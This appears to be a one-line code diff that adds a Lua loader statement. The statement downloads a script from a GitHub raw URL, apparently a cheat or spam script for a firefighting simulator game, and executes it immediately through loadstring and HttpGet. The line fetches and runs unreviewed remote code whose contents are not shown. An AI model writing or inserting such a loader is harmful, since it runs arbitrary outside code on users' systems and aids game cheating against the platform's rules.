@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/upd-firefighting-sim-spam5-lcc3ro4godfwl8.lua"))()
